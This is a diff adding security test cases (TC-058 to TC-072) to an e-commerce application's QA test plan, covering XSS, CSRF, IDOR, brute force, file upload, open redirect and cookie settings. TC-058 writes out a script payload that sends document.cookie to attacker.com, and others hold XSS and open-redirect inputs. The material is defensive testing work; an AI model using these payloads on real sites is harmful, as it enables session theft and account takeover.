@@ -791,6 +791,201 @@
 | **Test Steps** | 1. Log in to the application.<br>2. Wait for the session timeout period (30 minutes) without any activity.<br>3. Attempt to access a protected page (e.g., "My Account"). |
 | **Expected Results** | User session has expired. User is redirected to the login page. A message "Session expired. Please log in again" is displayed. |
 
+### TC-058: XSS in product review input
+
+| Field | Details |
+|-------|---------|
+| **Test Case ID** | TC-058 |
+| **Title** | Verify stored XSS is prevented in product review field |
+| **Description** | Verify that the system sanitizes user-submitted review text to prevent stored Cross-Site Scripting (XSS) attacks. |
+| **Requirement ID** | BR-028 |
+| **Type** | Security – Negative |
+| **Preconditions** | User is logged in and has purchased a product. |
+| **Test Steps** | 1. Navigate to a product detail page.<br>2. In the review text field, enter: `<script>document.location='https://attacker.com?c='+document.cookie</script>`.<br>3. Submit the review.<br>4. As a different user, navigate to the same product page and view the review. |
+| **Expected Results** | Script is not executed in any browser. The injected payload is either stripped, HTML-encoded (e.g., displayed as literal text), or the review is rejected with a validation error. No cookies or session data are leaked. |
+
+### TC-059: Brute force login prevention
+
+| Field | Details |
+|-------|---------|
+| **Test Case ID** | TC-059 |
+| **Title** | Verify account lockout after repeated failed login attempts |
+| **Description** | Verify that the system locks or rate-limits an account after a configurable number of consecutive failed login attempts to prevent brute force attacks. |
+| **Requirement ID** | BR-002, BR-028 |
+| **Type** | Security – Negative |
+| **Preconditions** | A valid user account exists. Application is accessible. |
+| **Test Steps** | 1. Navigate to the login page.<br>2. Enter a valid email with an incorrect password.<br>3. Repeat step 2 five consecutive times (or the configured threshold).<br>4. Attempt to log in a sixth time, including with the correct password. |
+| **Expected Results** | After the threshold number of failures, the account is temporarily locked. An error message such as "Too many failed attempts. Account is locked for 15 minutes" is displayed. A notification email is sent to the account owner. Login is denied even with correct credentials until the lockout period expires. |
+
+### TC-060: CSRF protection on checkout form
+
+| Field | Details |
+|-------|---------|
+| **Test Case ID** | TC-060 |
+| **Title** | Verify CSRF token is required on checkout form submission |
+| **Description** | Verify that the checkout form is protected against Cross-Site Request Forgery (CSRF) by validating a per-session CSRF token. |
+| **Requirement ID** | BR-011, BR-028 |
+| **Type** | Security – Negative |
+| **Preconditions** | User is logged in and has items in the cart. |
+| **Test Steps** | 1. Open browser developer tools and intercept the checkout form submission.<br>2. Remove or modify the CSRF token in the request.<br>3. Replay the modified request. |
+| **Expected Results** | Server rejects the request with a 403 Forbidden or equivalent error. Order is NOT placed. No state-changing action is performed. An error message is returned indicating the request is invalid. |
+
+### TC-061: Unauthorized access to admin panel by regular user
+
+| Field | Details |
+|-------|---------|
+| **Test Case ID** | TC-061 |
+| **Title** | Verify regular users cannot access admin panel |
+| **Description** | Verify that a regular customer account cannot access admin-only pages or endpoints. |
+| **Requirement ID** | BR-017, BR-028 |
+| **Type** | Security – Negative |
+| **Preconditions** | A regular (non-admin) user account is logged in. |
+| **Test Steps** | 1. Log in as a regular user.<br>2. Attempt to navigate directly to admin URLs (e.g., `/admin`, `/admin/products`, `/admin/orders`).<br>3. Attempt to call admin API endpoints directly (e.g., `DELETE /api/products/1`). |
+| **Expected Results** | All admin pages and endpoints return 403 Forbidden or redirect to the homepage/login page. The regular user cannot view, create, edit, or delete admin-managed resources. No admin UI is rendered. |
+
+### TC-062: Horizontal privilege escalation – accessing another user's order
+
+| Field | Details |
+|-------|---------|
+| **Test Case ID** | TC-062 |
+| **Title** | Verify user cannot access another user's order details |
+| **Description** | Verify that a logged-in user cannot view or modify orders belonging to a different user account (horizontal privilege escalation). |
+| **Requirement ID** | BR-024, BR-028 |
+| **Type** | Security – Negative |
+| **Preconditions** | Two separate registered user accounts exist. User A has placed Order #1001. User B is logged in. |
+| **Test Steps** | 1. Log in as User B.<br>2. Attempt to navigate directly to User A's order URL (e.g., `/account/orders/1001`).<br>3. Attempt to call the order API endpoint directly (e.g., `GET /api/orders/1001`). |
+| **Expected Results** | The application returns 403 Forbidden or 404 Not Found. User B cannot view any details of User A's order. No order data belonging to User A is exposed in the response. |
+
+### TC-063: Insecure Direct Object Reference (IDOR) on user profile
+
+| Field | Details |
+|-------|---------|
+| **Test Case ID** | TC-063 |
+| **Title** | Verify IDOR prevention on user profile endpoint |
+| **Description** | Verify that a user cannot access or modify another user's profile by manipulating the user ID in the URL or API request. |
+| **Requirement ID** | BR-001, BR-028 |
+| **Type** | Security – Negative |
+| **Preconditions** | Two registered accounts exist: User A (ID=101) and User B (ID=102). User B is logged in. |
+| **Test Steps** | 1. Log in as User B.<br>2. Navigate to own profile page (e.g., `/account/profile/102`).<br>3. Modify the URL to reference User A's ID (e.g., `/account/profile/101`).<br>4. Attempt to submit a profile update via the modified endpoint. |
+| **Expected Results** | Application returns 403 Forbidden or 404 Not Found for User A's profile. User B's session cannot retrieve or modify User A's personal details (name, email, address). No personal data is disclosed. |
+
+### TC-064: Password complexity enforcement
+
+| Field | Details |
+|-------|---------|
+| **Test Case ID** | TC-064 |
+| **Title** | Verify weak passwords are rejected during registration |
+| **Description** | Verify that the system enforces minimum password complexity rules (length, mixed case, numbers, special characters) during account registration. |
+| **Requirement ID** | BR-001, BR-028 |
+| **Type** | Security – Negative |
+| **Preconditions** | User is on the registration page. |
+| **Test Steps** | 1. Navigate to registration page.<br>2. Enter a weak password: "password" (all lowercase, no numbers or special characters).<br>3. Click "Register".<br>4. Repeat with passwords: "12345678", "ABCDEFGH", "abc123". |
+| **Expected Results** | Each weak password is rejected. A validation error is displayed specifying requirements (e.g., "Password must be at least 8 characters and include uppercase, lowercase, a number, and a special character"). Account is not created with any weak password. |
+
+### TC-065: Sensitive data not exposed in URL parameters
+
+| Field | Details |
+|-------|---------|
+| **Test Case ID** | TC-065 |
+| **Title** | Verify sensitive data is not passed in URL query parameters |
+| **Description** | Verify that sensitive information such as session tokens, passwords, credit card numbers, and email addresses are never transmitted in URL query strings, which could be logged or cached. |
+| **Requirement ID** | BR-028 |
+| **Type** | Security |
+| **Preconditions** | Application is accessible. Browser address bar and network logs are observable. |
+| **Test Steps** | 1. Perform login and inspect the resulting URL and all redirects.<br>2. Submit the checkout form and inspect all request URLs during the process.<br>3. Complete a payment and inspect the post-payment redirect URL.<br>4. Check browser history and server access logs for sensitive data in URLs. |
+| **Expected Results** | No session tokens, passwords, credit card numbers, CVVs, or personal data appear in any URL query parameter. POST requests are used for all form submissions. Redirect URLs do not include sensitive data. |
+
+### TC-066: Malicious file upload prevention
+
+| Field | Details |
+|-------|---------|
+| **Test Case ID** | TC-066 |
+| **Title** | Verify the system rejects malicious file uploads in product image fields |
+| **Description** | Verify that admin product image upload validates file type and rejects potentially malicious files (e.g., PHP scripts, HTML files disguised as images). |
+| **Requirement ID** | BR-018, BR-028 |
+| **Type** | Security – Negative |
+| **Preconditions** | Admin user is logged in on the Add/Edit Product page. |
+| **Test Steps** | 1. Navigate to Admin Panel > Products > Add New Product.<br>2. In the image upload field, attempt to upload a file named `shell.php` (containing PHP code).<br>3. Attempt to upload a file named `malicious.html`.<br>4. Attempt to upload an image file with the extension renamed to `.php` (e.g., `image.jpg` renamed to `image.php`). |
+| **Expected Results** | All non-image files are rejected with a clear error message (e.g., "Only JPG, PNG, GIF, and WebP files are allowed"). Uploaded files are stored with sanitized, non-executable names. Files are not accessible via a publicly executable path. Server-side MIME type validation is applied. |
+
+### TC-067: Password reset token single-use and expiry
+
+| Field | Details |
+|-------|---------|
+| **Test Case ID** | TC-067 |
+| **Title** | Verify password reset token expires and cannot be reused |
+| **Description** | Verify that password reset links expire after a defined time window and cannot be used more than once. |
+| **Requirement ID** | BR-003, BR-028 |
+| **Type** | Security – Negative |
+| **Preconditions** | User has requested a password reset email. |
+| **Test Steps** | 1. Request a password reset link for a registered account.<br>2. Use the reset link to successfully reset the password.<br>3. Attempt to use the same reset link again.<br>4. Separately, request a new reset link, wait longer than the token expiry window (e.g., 2 hours), and then attempt to use it. |
+| **Expected Results** | After the first successful use, the reset link is invalidated — any subsequent use returns an error: "This password reset link has already been used or has expired." Expired tokens return the same error. Users must request a new reset link. |
+
+### TC-068: HTTPS enforcement and HTTP-to-HTTPS redirect
+
+| Field | Details |
+|-------|---------|
+| **Test Case ID** | TC-068 |
+| **Title** | Verify all pages are served over HTTPS and HTTP is redirected |
+| **Description** | Verify that the entire application is served exclusively over HTTPS and that any HTTP request is automatically redirected to HTTPS. |
+| **Requirement ID** | BR-028, BR-029 |
+| **Type** | Security |
+| **Preconditions** | Application is deployed on a production-like environment. |
+| **Test Steps** | 1. Attempt to access the application using HTTP (e.g., `http://www.example.com`).<br>2. Attempt to access the login page, checkout, and payment pages via HTTP.<br>3. Check that the SSL/TLS certificate is valid and not expired.<br>4. Verify TLS version using a tool such as SSL Labs. |
+| **Expected Results** | All HTTP requests receive a 301 Moved Permanently redirect to the equivalent HTTPS URL. No page is served over plain HTTP. TLS certificate is valid, issued by a trusted CA, and not expired. TLS version is 1.2 or higher. HSTS header is present in responses. |
+
+### TC-069: Secure cookie attributes
+
+| Field | Details |
+|-------|---------|
+| **Test Case ID** | TC-069 |
+| **Title** | Verify session and authentication cookies have secure attributes |
+| **Description** | Verify that authentication and session cookies are set with the HttpOnly, Secure, and SameSite attributes to prevent theft and CSRF. |
+| **Requirement ID** | BR-028 |
+| **Type** | Security |
+| **Preconditions** | User logs in to the application. Browser developer tools are accessible. |
+| **Test Steps** | 1. Navigate to the login page.<br>2. Log in with valid credentials.<br>3. Open browser developer tools > Application > Cookies.<br>4. Inspect the session/authentication cookie attributes. |
+| **Expected Results** | Session and authentication cookies have:<br>- **HttpOnly** flag set (cookie inaccessible via JavaScript).<br>- **Secure** flag set (cookie only sent over HTTPS).<br>- **SameSite** attribute set to `Strict` or `Lax` (prevents CSRF via cross-site requests).<br>- Reasonable expiry time aligned with session timeout policy. |
+
+### TC-070: Rate limiting on password reset endpoint
+
+| Field | Details |
+|-------|---------|
+| **Test Case ID** | TC-070 |
+| **Title** | Verify password reset endpoint is rate-limited |
+| **Description** | Verify that the password reset request endpoint enforces rate limiting to prevent email enumeration and email flooding attacks. |
+| **Requirement ID** | BR-003, BR-028 |
+| **Type** | Security – Negative |
+| **Preconditions** | Application is accessible. A valid registered email address is known. |
+| **Test Steps** | 1. Navigate to the "Forgot Password" page.<br>2. Submit the password reset form with the same email address 10 or more times in rapid succession.<br>3. Check the inbox for the number of reset emails received.<br>4. Observe system responses after exceeding the rate limit. |
+| **Expected Results** | After exceeding the rate limit (e.g., more than 3–5 requests per minute), the system throttles further requests. An error message such as "Too many requests. Please wait before trying again" is displayed. Only a limited number of reset emails are dispatched. The IP or account is temporarily blocked from further requests. |
+
+### TC-071: Open redirect prevention
+
+| Field | Details |
+|-------|---------|
+| **Test Case ID** | TC-071 |
+| **Title** | Verify open redirect is prevented on login and post-checkout redirects |
+| **Description** | Verify that the application does not allow arbitrary redirect URLs in login or checkout flows, which could be exploited in phishing attacks. |
+| **Requirement ID** | BR-028 |
+| **Type** | Security – Negative |
+| **Preconditions** | Application is accessible. |
+| **Test Steps** | 1. Attempt to access the login page with a malicious redirect parameter (e.g., `/login?redirect=https://attacker.com`).<br>2. Log in with valid credentials.<br>3. Observe the post-login redirect destination.<br>4. Repeat using encoded and obfuscated redirect values (e.g., `%2F%2Fattacker.com`, `//attacker.com`). |
+| **Expected Results** | The application ignores or validates the redirect parameter. Post-login, the user is redirected only to a known, safe internal path (e.g., homepage or account dashboard). No redirect to external or attacker-controlled domains occurs. The response does not include untrusted data in `Location` headers. |
+
+### TC-072: XSS in checkout address fields
+
+| Field | Details |
+|-------|---------|
+| **Test Case ID** | TC-072 |
+| **Title** | Verify XSS is prevented in checkout shipping address fields |
+| **Description** | Verify that user-entered data in shipping address fields during checkout is properly sanitized to prevent reflected and stored XSS attacks. |
+| **Requirement ID** | BR-011, BR-028 |
+| **Type** | Security – Negative |
+| **Preconditions** | User has items in the cart and is on the checkout page. |
+| **Test Steps** | 1. Navigate to the checkout shipping address form.<br>2. In the "Address Line 1" field, enter: `<img src=x onerror=alert('XSS')>`.<br>3. In the "City" field, enter: `"><script>alert(1)</script>`.<br>4. Proceed through the checkout and complete the order.<br>5. As admin, view the order details page and observe how the address is rendered. |
+| **Expected Results** | No JavaScript is executed in the browser at any point (during checkout or when admin views the order). Input is HTML-encoded before rendering (e.g., `&lt;script&gt;`). The application does not expose raw user input back to any browser without sanitization. |
+
 ---
 
 ## Traceability Matrix
@@ -854,3 +1049,18 @@
 | TC-055 | BR-020 | Additional |
 | TC-056 | BR-028 | Security |
 | TC-057 | BR-028 | Security |
+| TC-058 | BR-028 | Security |
+| TC-059 | BR-002, BR-028 | Security |
+| TC-060 | BR-011, BR-028 | Security |
+| TC-061 | BR-017, BR-028 | Security |
+| TC-062 | BR-024, BR-028 | Security |
+| TC-063 | BR-001, BR-028 | Security |
+| TC-064 | BR-001, BR-028 | Security |
+| TC-065 | BR-028 | Security |
+| TC-066 | BR-018, BR-028 | Security |
+| TC-067 | BR-003, BR-028 | Security |
+| TC-068 | BR-028, BR-029 | Security |
+| TC-069 | BR-028 | Security |
+| TC-070 | BR-003, BR-028 | Security |
+| TC-071 | BR-028 | Security |
+| TC-072 | BR-011, BR-028 | Security |
